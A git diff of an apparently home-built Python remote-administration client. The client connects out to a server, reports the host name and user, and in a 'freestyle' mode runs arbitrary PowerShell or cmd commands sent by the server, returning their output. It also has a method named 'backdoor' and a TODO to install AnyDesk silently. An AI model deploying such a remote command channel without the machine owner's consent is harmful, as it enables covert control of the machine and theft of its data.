@@ -11,7 +11,7 @@ import time
 import sys
 import os
 
-# DONE: Fixed file transfers & Restart confirmation
+# TODO: Install Anydesk Silent Mode
 
 
 class Client:
@@ -60,6 +60,9 @@ class Client:
         except FileNotFoundError:
             print("Anydesk.exe was not found.")
             return
+
+    def install_anydesk(self):
+        pass
 
     def screenshot(self):
         self.d = datetime.now().replace(microsecond=0)
@@ -115,20 +118,99 @@ class Client:
         os.remove(self.filename)
         os.remove(self.path)
 
+    def get_date(self):
+        d = datetime.now().replace(microsecond=0)
+        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
+
+        return dt
+
+    def execute(self, platform, cmd):
+        dt = self.get_date()
+        filename = rf"c:\MekifRemoteAdmin\{platform} {self.hostname} {str(self.localIP)} {dt}.txt"
+
+        def run_command():
+            if str(platform) == "ps":
+                try:
+                    with open(filename, 'w') as file:
+                        p = subprocess.run(["powershell", "-Command", cmd], stdout=file)
+
+                except FileExistsError:
+                    pass
+
+            elif str(platform) == "cmd":
+                try:
+                    with open(filename, 'w') as file:
+                        p = subprocess.run(cmd, stdout=file)
+
+                except FileExistsError:
+                    pass
+
+        def send_file_name():
+            soc.send(filename.encode())
+            msg = soc.recv(1024).decode()
+            print(msg)
+
+            return
+
+        def send_file_size():
+            length = os.path.getsize(filename)
+            print(f"PSFile Size: {length}")
+            soc.send(convert_to_bytes(length))
+
+            return length
+
+        def send_file_content():
+            try:
+                with open(filename, 'rb') as file:
+                    data = file.read(1024)
+                    while data:
+                        soc.send(data)
+                        if not data:
+                            break
+
+                        data = file.read(1024)
+
+            except (FileNotFoundError, FileExistsError):
+                return False
+
+        def confirm():
+            msg = soc.recv(1024).decode()
+            print(f"@Server: {msg}")
+            soc.send(f"{self.hostname} | {self.localIP}: Powershell Command Completed.\n".encode())
+
+        run_command()
+        send_file_name()
+        send_file_size()
+        send_file_content()
+        confirm()
+
     def backdoor(self, soc):
         try:
             # Send Computer Name to Server
             ident = self.hostname
-            soc.send(ident.encode())
+            try:
+                soc.send(ident.encode())
+
+            except (WindowsError, socket.error):
+                return False
 
             user = self.current_user
-            soc.send(user.encode())
+            try:
+                soc.send(user.encode())
 
-            # Wait For Commands
-            message = soc.recv(self.buffer_size).decode()
-            print(f"{colored(message, 'green')}")
+            except (WindowsError, socket.error):
+                return False
 
-        except (WindowsError, socket.error) as e:
+            # Wait For Message
+            try:
+                message = soc.recv(self.buffer_size).decode()
+                print(f"{colored(message, 'green')}")
+
+            except (WindowsError, socket.error):
+                return False
+
+        except (ConnectionResetError, ConnectionError,
+                ConnectionAbortedError, ConnectionRefusedError) as e:
             print(e)
             return False
 
@@ -136,7 +218,8 @@ class Client:
             try:
                 command = soc.recv(self.buffer_size).decode()
 
-            except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
+            except (ConnectionResetError, ConnectionError,
+                    ConnectionAbortedError, WindowsError, socket.error):
                 break
 
             try:
@@ -146,24 +229,26 @@ class Client:
 
                 # Freestyle
                 if str(command).lower() == "freestyle":
-                    print(command)
                     while True:
                         try:
                             command = soc.recv(1024).decode()
-                            if str(command) == "ps":
+                            if str(command).lower() == "ps":
                                 cmd = soc.recv(1024).decode()
-                                run_powershell(cmd, self.hostname, self.localIP)
+                                self.execute("ps", cmd)
 
-                            elif str(command) == "cmd":
+                            elif str(command).lower() == "cmd":
                                 cmd = soc.recv(1024).decode()
-                                run_cmd(cmd, self.hostname, self.localIP)
+                                self.execute("cmd", cmd)
 
-                            elif str(command) == "back":
+                            elif str(command).lower() == "instad":
+                                pass
+
+                            elif str(command).lower() == "back":
                                 msg = "back".encode()
                                 soc.send(msg)
                                 break
 
-                        except socket.error as e:
+                        except (WindowsError, socket.error) as e:
                             print(e)
                             break
 
@@ -330,43 +415,6 @@ class Client:
                 break
 
 
-def run_powershell(cmd, hostname, localip):
-    try:
-        d = datetime.now().replace(microsecond=0)
-        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
-        filename = rf"c:\MekifRemoteAdmin\powershell {hostname} {str(localip)} {dt}.txt"
-        with open(filename, 'w') as file:
-            p = subprocess.run(["powershell", "-Command", cmd], stdout=file)
-
-    except FileExistsError:
-        pass
-
-    soc.send(filename.encode())
-    msg = soc.recv(1024).decode()
-    print(msg)
-
-    length = os.path.getsize(filename)
-    print(f"PSFile Size: {length}")
-    soc.send(convert_to_bytes(length))
-
-    try:
-        with open(filename, 'rb') as ps_file:
-            ps_data = ps_file.read(1024)
-            while ps_data:
-                soc.send(ps_data)
-                if not ps_data:
-                    break
-
-                ps_data = ps_file.read(1024)
-
-        msg = soc.recv(1024).decode()
-        print(f"@Server: {msg}")
-        soc.send(f"{hostname} | {localip}: Powershell Command Completed.\n".encode())
-
-    except socket.error:
-        return False
-
-
 def convert_to_bytes(no):
     result = bytearray()
     result.append(no & 255)
@@ -383,70 +431,6 @@ def bytes_to_number(b):
     return res
 
 
-def run_cmd(cmd, hostname, localip):
-    d = datetime.now().replace(microsecond=0)
-    dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
-    try:
-        filename = rf"c:\MekifRemoteAdmin\cmd {hostname} {str(localip)} {dt}.txt"
-        with open(filename, 'w') as file:
-            p = subprocess.run(cmd, stdout=file)
-
-    except FileExistsError:
-        pass
-
-    soc.send(filename.encode())
-    msg = soc.recv(1024).decode()
-    print(msg)
-
-    length = os.path.getsize(filename)
-    print(f"PSFile Size: {length}")
-    soc.send(convert_to_bytes(length))
-
-    try:
-        with open(filename, 'rb') as cmd_file:
-            cmd_data = cmd_file.read(1024)
-            while cmd_data:
-                soc.send(cmd_data)
-                if not cmd_data:
-                    break
-
-                cmd_data = cmd_file.read(1024)
-
-        msg = soc.recv(1024).decode()
-        print(f"@Server: {msg}")
-        soc.send(f"{hostname} | {localip}: CMD Command Completed.\n".encode())
-
-    except socket.error:
-        return False
-
-
-def check_file_path(pat, subpat=None, file=None):
-    if subpat is None:
-        pass
-
-    if os.path.exists(pat):
-        if not subpat:
-            newfile = os.path.join(pat, file)
-            print(newfile)
-
-            return newfile
-
-        elif not file:
-            return False
-
-    else:
-        os.makedirs(pat)
-        if not subpat:
-            newfile = os.path.join(pat, file)
-            return newfile
-
-        else:
-            newpath = os.path.join(pat, subpat)
-            newfile = os.path.join(newpath, file)
-
-        return newfile
-
-
 if __name__ == "__main__":
     client_version = "1.0.0"
     task_list = []
@@ -457,8 +441,8 @@ if __name__ == "__main__":
     while True:
         for server in servers:
             client = Client(server, mekif_path)
+            time.sleep(0.5)
             try:
-                time.sleep(1)
                 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 soc.connect(server)
@@ -466,6 +450,8 @@ if __name__ == "__main__":
 
             except socket.error as e:
                 print(e)
+                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                soc.close()
 
         soc = socket.socket()
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
